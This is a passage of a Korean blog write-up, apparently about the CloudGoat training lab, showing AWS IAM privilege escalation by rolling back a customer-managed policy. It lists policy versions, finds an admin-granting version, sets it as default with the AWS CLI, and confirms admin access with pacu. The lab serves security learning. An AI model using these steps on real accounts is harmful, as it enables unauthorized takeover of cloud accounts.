policies permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Raynor 이전 버전의 IAM policies</h3>\n<ul>\n<li>Customer managed policies에서 IAM을 <code class=\"language-text\">list-policies</code>를 통해 관리형 정책들을 나열하고 <code class=\"language-text\">--only attachged</code> 옵션을 통해 연결된 정책만 추출하고 <code class=\"language-text\">--scope</code> 범위를 Local로 지정하여 해당 범위 내에서만 검색하여 고객 관리형 정책만 추출하고 <code class=\"language-text\">--query</code> 옵션을 통해 관련된 정보를 추출하는데 사용하여 좀더 세부적으로 정책들을 나열하겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">aws iam list-policies <span class=\"token punctuation\">\\</span> \n--only-attached <span class=\"token punctuation\">\\</span> \n--scope Local <span class=\"token punctuation\">\\</span>\n--query <span class=\"token string\">\"Policies[?starts_with(PolicyName, 'cg')]\"</span> <span class=\"token punctuation\">\\</span>\n--profile bob1</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABUUlEQVQoz42RyVLCQBCGhwgihGyEJSSEnZiQBYPgvpblQTn5CD6C73/4rBlLL1ZZHr7p6Z5/uubvEe/Fno/ijVW6pTy94Wx3S3a3JyhuiJYFx0lJFJfEyYYk3bKM1sSrjSIrLliXW25fQ55eZmT+HOFYIbYxxLBDLGeEbga47RFGa4BWc6nVO9SOumi1tooqr3epN3oqCmEghP1FxUKIiqmEi2jDbHHCeJqTFlfk62u2Z48k6TmeHykGwfEPQZiommEFmM4XjWYfYbtjdTCa5vS8JT1vgWmHmPaQlukrdGOAbvg0WwOaLY+G7v3sZV1qJQ29jxCazeFRlzS/JCsuSfML/GGM05koW5UDaUdHOhGa9RtZ/0bmcpEXT3cPnF89EyXyc+6JVzsms4L5smQ0yageuqq5VnX+RMghyxd2ejOFtON2p7Q7E2VdjkAixf9p+Ak7/bJOsC7olgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./5.png\"\n        title=\"./5.png\"\n        src=\"/static/0c7e2fe9b8e074143c47f00bdac78f03/37523/5.png\"\n        srcset=\"/static/0c7e2fe9b8e074143c47f00bdac78f03/e9ff0/5.png 180w,\n/static/0c7e2fe9b8e074143c47f00bdac78f03/f21e7/5.png 360w,\n/static/0c7e2fe9b8e074143c47f00bdac78f03/37523/5.png 720w,\n/static/0c7e2fe9b8e074143c47f00bdac78f03/6029f/5.png 906w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Customer managed policies에 대한 <code class=\"language-text\">cg-raynor-policy-iam_privesc_by_rollback_cgidesxwoc66a4</code> 추가 정보를 확인할 수가 있으며 기본 버전 값은 <code class=\"language-text\">v1</code> 임을 인지할 수 있었습니다.</li>\n<li>aws 정책에 따라 IAM Customer managed policies을 변경하고 AWS가 정책을 변경할 때 젼경된 정책은 기존 정책을 덮어쓰지 않씁니다.</li>\n<li>대신 IAM은 관리형 정책의 새로운 버전을 생성합니다. 총 IAM은 Customer Managed Policies를 최대 5개 버전을 저장합니다.</li>\n<li>정책에 대한 권한에 대한 충분한 정책 세부 정보들을 해당 <code class=\"language-text\">v1</code> 버전에 맞게 정책 권한들을 나열하였습니다. 해당 형태의 format은 <code class=\"language-text\">json</code> 에 따릅니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">aws iam get-policy-version <span class=\"token punctuation\">\\</span>\n--policy-arn arn:aws:iam::712987748923:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidesxwoc66a4 <span class=\"token punctuation\">\\</span> \n--version-id <span class=\"token string\">\"v1\"</span> <span class=\"token punctuation\">\\</span> \n--profile bob1 <span class=\"token punctuation\">\\</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 51.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABeklEQVQoz41SyVLCQBCdsAcC2QlJCDuJgBQGEmRVD0qVB0/6/7/yrG7A4oAUh1c9Mz39+vUiJtMUy9UrZk8rbHbvWD3vMX37QnvziWWyxSxeI15skC5fME+22O0/sH89IEn3iOdbxIs1Dj8eDt8+OqEPYdpdNFtjBJ1HBO0JGl6IemMIy+mDfFa9z6CzYXXguENGVW2irLioVF3IigO50kChZEEISUWp7GAYLTCLd7DqPVSqHr8JqQYhZAhRgRDlkyUoR19GBcWzzaiQMhpEJqezM1cwWWnDj6CbHUZNC1DTAyg1H6oe8L0o10Ex/0FIWY0PZCmzYXURjhIMwhi62WaiqupDM+jcYsJzzE3CM+je7k4xnq7geCE0o8X9I5VCHMs8/7tKeOkk6wcjeMEIpt3jsq8F3qUwX7T+LE2MenrMeGr4RdKbPaTPNO5olGIQzlkhlUgDKJRs7llRtu8iY0JSQqq85gNPmdbG9SPeR9o12xnwWzZv3EX4C9Iu8mGzsK70AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./6.png\"\n        title=\"./6.png\"\n        src=\"/static/7c5d6204f9ea499ca8b0a14a8312e28e/37523/6.png\"\n        srcset=\"/static/7c5d6204f9ea499ca8b0a14a8312e28e/e9ff0/6.png 180w,\n/static/7c5d6204f9ea499ca8b0a14a8312e28e/f21e7/6.png 360w,\n/static/7c5d6204f9ea499ca8b0a14a8312e28e/37523/6.png 720w,\n/static/7c5d6204f9ea499ca8b0a14a8312e28e/58213/6.png 902w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Policies Document에 따르면 정책이 있는 IAM credential이 모든 리소스에 대해 IAM 에 대한 import, list 작업을 수행할 수 있었음을 보여드렸습니다.</li>\n<li>해당 정책은 또한 <code class=\"language-text\">\"iam:SetDefaultPolicyVersion</code> 모든 리소스에 대해 하나의 “Setting” 작업이 허용되었다는 것을 보여주고 있습니다.</li>\n<li>해당 권한들의 리스트들은 정상적으로 보이고 많은 보안 스캐너에 의해 플래그가 지정되지 않을 수도 있지만 “iam:SetDefaultPolicyVersion” 허용된다는 점이 심각한 보안 문제를 야기할 수 있습니다.</li>\n</ul>\n<h3 id=\"iamsetdefaultpolicyversion-권한이-왜-보안-문제일까\" style=\"position:relative;\"><a href=\"#iamsetdefaultpolicyversion-%EA%B6%8C%ED%95%9C%EC%9D%B4-%EC%99%9C-%EB%B3%B4%EC%95%88-%EB%AC%B8%EC%A0%9C%EC%9D%BC%EA%B9%8C\" aria-label=\"iamsetdefaultpolicyversion 권한이 왜 보안 문제일까 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>iam:SetDefaultPolicyVersion 권한이 왜 보안 문제일까?</h3>\n<ul>\n<li>\n<p><code class=\"language-text\">SetDefualtPolicyVersion</code> 은 지정된 정책의 지정된 버전을 정책의 default 버전으로 설정합니다. 해당 작업은 정책이 연결된 모든 사용자 구룹, 역활에 영향을 줍니다.</p>\n</li>\n<li>\n<p>해당 권한이 있는 IAM Access Credential은 현재 사용하지 않는 기존 정책 버전을 통해 권한을 승격할 수 있습니다.</p>\n</li>\n<li>\n<p>액세스 권한이 있는 정책에 기본값이 아닌 버전이 있는 경우 기본 버전을 다른 기존 버전으로 변경할 수가 있습니다.</p>\n</li>\n<li>\n<p><code class=\"language-text\">iam:SetDefaultPolicyVersion</code> 설정이 어떻게 보안 문제로 이어져있는지 확인하기 위해 다른 버전의 고객 관리 정책이 있는지 확인을 해야 합니다.</p>\n</li>\n<li>\n<p><code class=\"language-text\">cg-raynor-policy-iam_privesc_by_rollback_cgidesxwoc66a4</code>  최대 5가지 버전이 존재합니다.</p>\n</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 19.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA/UlEQVQY0z3Fy1KCUACA4SOZVlN5ZUJBEU0QBEKUywEkxhldtmvRvk3v/wB/M9W0+OYTSVqRy4Y0KymKI5UsCOoLk+aNdJ+QpDm73QEpS/K8QBYV1fGVsqyp64aqPHG6JHx8qbx/ThDL5wh95jEYmZiWj6bb6LqNqa8xTI+J7rBYhjwZHuPpBqU9QIgHhPKIUHq/t/oIoSLEGOG4CaYVMF/45MWZbSgJo4oorokPDe424yWuseMzxmrPdVelc6PS7oxoXfX/CeXPah2xsHyMuUt8qHG9hE0gmTkJfpBhu3v8UOJ4CZ6fYa1CtOma/nBG91b9cXc/Zqj1GGk9vgHvh3I7RtlAfAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./7.png\"\n        title=\"./7.png\"\n        src=\"/static/456359012ed7b3ac5c682cb55fc169fe/37523/7.png\"\n        srcset=\"/static/456359012ed7b3ac5c682cb55fc169fe/e9ff0/7.png 180w,\n/static/456359012ed7b3ac5c682cb55fc169fe/f21e7/7.png 360w,\n/static/456359012ed7b3ac5c682cb55fc169fe/37523/7.png 720w,\n/static/456359012ed7b3ac5c682cb55fc169fe/79e48/7.png 865w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>assets 폴더안에는 각 버전별로 존재하고 있는 것을 확인할 수 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 63.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAABk0lEQVQ4y52SSU/CUBSFy1AoMnRuKXSmIFIG3TBLwKjRDUu3mhA3rtz5H/zTx9yHTcDEpLA4OX29571+vfdx2+0Ldh9rvH+N8Pn2gO/FK543O0S3T1gvNxhPVpgvNlje3jMnLZZ3mM3XWK0fMZ6ucH0zZe+jzhCcUW+jN+yjPQhhWza8cghLsCDJDkTFg6R4kFUfihZA1UPm5WoTNclhtVLZQiYngy/qyPEqOC4rgi8YEKUQZqOLiuairLgoCBRQQPVMTmTOZWp7ZQ/WrC6xDDmXzcsgaUaAeDBF2BrBCwbwwyEsuwtF82FabUiKyzYk+f/EUYgvaqjUmr8bPVRFmxHyRZVRkiic6sDkQTdb6A2mCFojuH5/T9i8hKx6MOoRRNllv5easCo2UW902AHU8GLJQL6wJ0z8JELNaOEqnjCyY0L/XEIbDTaE4IiQQkkfTyQM0Y3HbMKOF/8hbJ9GSBMlKiJU9QCi7EC4MM/vIQVpyvFwhiDa30Oatm5GBz100hEWBI0RJl9PnKhI1N/kTqYh/AHimDxglXPKeQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./8.png\"\n        title=\"./8.png\"\n        src=\"/static/eb2917ca2595825d68aa5aa706911599/37523/8.png\"\n        srcset=\"/static/eb2917ca2595825d68aa5aa706911599/e9ff0/8.png 180w,\n/static/eb2917ca2595825d68aa5aa706911599/f21e7/8.png 360w,\n/static/eb2917ca2595825d68aa5aa706911599/37523/8.png 720w,\n/static/eb2917ca2595825d68aa5aa706911599/65d79/8.png 905w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>5가지 정책 버전이 <code class=\"language-text\">cg-raynor-policy-iam_privesc_by_rollback_cgidesxwoc66a4</code> 에 있습니다.</li>\n<li>자 그러면<code class=\"language-text\">raynor-policy-iam_privesc_by_rollback_cgidesxwoc66a4</code>  사용자 <code class=\"language-text\">iam:SetDefaultPolicyVersion</code> 에게 기본 버전 v1에 대한 권한이 있으므로 사용자는 모든 버전으로 롤백이 가능합니다.</li>\n<li>이러한 버전에 추가 권한이 있는 경우 권한 상승이 가능하고 추가 권한에 따라 각각 다르게 나타납니다.</li>\n<li>각 정책 버전을 나열하고 추가 권한에 대한 액세스 권한을 얻을 수 있는지 확인해보겠습니다.</li>\n</ul>\n<h3 id=\"취약한-정책-버전\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%ED%95%9C-%EC%A0%95%EC%B1%85-%EB%B2%84%EC%A0%84\" aria-label=\"취약한 정책 버전 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약한 정책 버전</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">aws iam get-policy-version --policy-arn arn:aws:iam::712987748923:policy\n/cg-raynor-policy-iam_privesc_by_rollback_cgidesxwoc66a4 --version-id <span class=\"token string\">\"v4\"</span> --profile bob1</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 40.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABLUlEQVQoz42R3U7CQBCFFxD56bbdUpGfllJSGpGo0FYKtEF6Y/QN9I7EB/D9746ZKYp3cPHtbHbOnN3ZEbvdOz4Pexy+p/j4irFe5Qi2bwjXr8i2BaIkx3P6gmWc8T6K8zIeSdd7pJsCT8sNBk4IYagRRv4M09kcrh/CtDxI2YfUB6Ccbrp8RvuW1odmOGjLAZrtHkN5onJlQdQUhKiaaLRuEUxjREmBbi+AZfssqpKoYpyomqf4yzFXqalSXy4mavUOVMfD0L2H3Z1AGkNcN7ssuhxVGpI7QTdNggXCu4SNqVW67L/mnKkgUb1xw21TZGOhQwhZRmpJGH8F50wFFWj6EMmqwMMiQxBG8CaPcLw5/6Nlj6E648tfSK8idNNhA5okT065PE1pOMylhj/mTsKpNHHf5gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./9.png\"\n        title=\"./9.png\"\n        src=\"/static/cfb0bf407cddc42a96a750caa66dd198/37523/9.png\"\n        srcset=\"/static/cfb0bf407cddc42a96a750caa66dd198/e9ff0/9.png 180w,\n/static/cfb0bf407cddc42a96a750caa66dd198/f21e7/9.png 360w,\n/static/cfb0bf407cddc42a96a750caa66dd198/37523/9.png 720w,\n/static/cfb0bf407cddc42a96a750caa66dd198/0955e/9.png 901w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>정책 버전 4에는 심각한 취약점이 존재합니다.</li>\n<li>v4의 권한은 사용자에게 AWS 계정에 대한 관리 액세스 권한에대해 <code class=\"language-text\">Effect: Allow</code> 를 부여하고 있습니다.</li>\n<li>Highly-level iam 사용자로부터 v4 를 기본 버전으로 만들어보겠습니다. v4를 기본버전으로 만들어서 관리자 액세스 권한이 있는 사용자가 되도록 Escalation을 진행하는 것 입니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">aws iam <span class=\"token punctuation\">\\</span>\n set-default-policy-version <span class=\"token punctuation\">\\</span> \n--policy-arn arn:aws:iam::712987748923:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidesxwoc66a4 <span class=\"token punctuation\">\\</span> \n--version-id v4 --profile bob1</code></pre></div>\n<ul>\n<li><code class=\"language-text\">pacu</code> open source tools 를 이용하여 IAM enumerating을 하여 추가 사용 권한을 획득하겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">run iam__enum_permissions</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABNUlEQVQoz2VRaW+CQBBdj9pYRWBB5D7kFKUtFXokTez//1OvmRG0ST+87OzAO3ZG2F6JoupQHnpGlDTYZ68oDx3y8owgOsJycjytHcwXEkIoEJPNFVP1Xo/3JH3BsfnCuf9B211Q1e+I9g3a8wXP7TeOzSey4o3Fs6JlA+Ls2MSGovpYb1xsNB/LlQ3h+BVMK4XjlQzT2nMa2y2YRD3LzuB4FTQZDuTgJqTq15q+EU9IM8Z2l4KERxE/rOGFNZ+PS4tB7tO5/v+JYy2GO6nTE4gcxCd4wQFym3AyMtBkBGObQDcikLm5SzkApSbMFwYmM43N2NCyc9SnD55dVfcsTosZFyLNhBMSafYgb8S/GPv0j3D9irdMSIsW4ZCS+iRGoES6GXNNs1opLqejWlE9fgHNjwR/ASBjs6IbPz8qAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./10.png\"\n        title=\"./10.png\"\n        src=\"/static/7058281f09060b29aab79cbe993142e2/37523/10.png\"\n        srcset=\"/static/7058281f09060b29aab79cbe993142e2/e9ff0/10.png 180w,\n/static/7058281f09060b29aab79cbe993142e2/f21e7/10.png 360w,\n/static/7058281f09060b29aab79cbe993142e2/37523/10.png 720w,\n/static/7058281f09060b29aab79cbe993142e2/1cfc2/10.png 900w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>위 단계에서 차례대로 취약한 버전 정보를 도출하였고 해당 정책으로 부터 권한 상승이 가능하지 <code class=\"language-text\">pacu</code> 도구를 사용하여 <code class=\"language-text\">iam__enum_permissions</code> 모듈을 사용하여 권한 상승을 성공적으로 수행하였습니다.</li>\n<li>현재 이미 admin 권한을 획득한 것을 확인할 수 있습니다.</li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\">시나리오 개요</a></p>\n<ul>\n<li><a href=\"#%EC%9E%90%EC%9B%90\">자원</a></li>\n<li><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\">취약점</a></li>\n<li><a href=\"#%EB%AA%A9%ED%91%9C\">목표</a></li>\n<li><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD-%EC%84%A4%EC%A0%95\">시나리오 환경 설정</a></li>\n<li><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\">Exploit 흐름도</a></li>\n<li><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 시나리오 흐름도</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\">Exploit 시나리오</a></p>\n<ul>\n<li><a href=\"#iam-user-raynor-%EC%82%AC%EC%9A%A9-%EA%B0%80%EB%8A%A5%ED%95%9C-%EA%B6%8C%ED%95%9C-%EC%97%B4%EA%B1%B0\">IAM User: Raynor 사용 가능한 권한 열거</a></li>\n<li><a href=\"#raynor-%EC%9D%B4%EC%A0%84-%EB%B2%84%EC%A0%84%EC%9D%98-iam-policies\">Raynor 이전 버전의 IAM policies</a></li>\n<li><a href=\"#iamsetdefaultpolicyversion-%EA%B6%8C%ED%95%9C%EC%9D%B4-%EC%99%9C-%EB%B3%B4%EC%95%88-%EB%AC%B8%EC%A0%9C%EC%9D%BC%EA%B9%8C\">iam:SetDefaultPolicyVersion 권한이 왜 보안 문제일까?</a></li>\n<li><a href=\"#%EC%B7%A8%EC%95%BD%ED%95%9C-%EC%A0%95%EC%B1%85-%EB%B2%84%EC%A0%84\">취약한 정책 버전</a></li>\n</ul>\n</li>\n</ul>\n</div>","excerpt":"클라우드 서비스 취약점 분석 2 [Scenario 1]:  IAM Privilege Escalation By Rollback 시나리오 개요 자원 한 명의 IAM User (5 정책 버전) 취약점 IAM User: Raynor 을 통한 이전 버전으로 rollback 하는 기능을 이용하여 권한 상승이 가능합니다. 목표 공격자는 highly-limited IAM 사용자 부터 시작해서 이전 IAM 정책 버전을 검토하고 전체 관리자 권한을 허용하는 버전을 복원해서 권한 상승 취약점을 이용할 수 있습니다. IAM 사용자  security credentials 시나리오 환경 설정  Exploit 흐름도  exploit 시나리오 흐름도 IAM 사용자 “Raynor” 로 시작해서 공격자는 사용할 수 있는 권한이 몇 개 밖에 없습니다. 공격자는 Raynor의 권한을 분석하고 SetDefaultPolicyVersion 권한을 확인합니다. 이전의 버전을 기본값으로 설정하여 정책의 다른 4개 버전에 대한…","frontmatter":{"date":"December 31, 2021","title":"클라우드 서비스 취약점 분석 2 (CloudGoat: IAM Privilege Escalation By Rollback)","categories":"CLOUD","author":"Zer0Luck","emoji":"🤭"},"fields":{"slug":"/cloud-service-vuln-2/"}},"next":{"id":"d22463db-4ec6-5895-acda-62534078724c","html":"<h1 id=\"클라우스-서비스-취약점-분석-3\" style=\"position:relative;\"><a href=\"#%ED%81%B4%EB%9D%BC%EC%9A%B0%EC%8A%A4-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-3\" aria-label=\"클라우스 서비스 취약점 분석 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>클라우스 서비스 취약점 분석 3</h1>\n<h1 id=\"scenario-2-lambda_privesc\" style=\"position:relative;\"><a href=\"#scenario-2-lambda_privesc\" aria-label=\"scenario 2 lambda_privesc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[Scenario 2]: lambda_privesc</h1>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">Size<span class=\"token punctuation\">:</span> Small\nDifficulty<span class=\"token punctuation\">:</span> Easy\nCommand<span class=\"token punctuation\">:</span> $ <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>cloudgoat<span class=\"token punctuation\">.</span>py create lambda_privesc</code></pre></div>\n<h2 id=\"시나리오-개요\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\" aria-label=\"시나리오 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 개요</h2>\n<h3 id=\"자원\" style=\"position:relative;\"><a href=\"#%EC%9E%90%EC%9B%90\" aria-label=\"자원 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 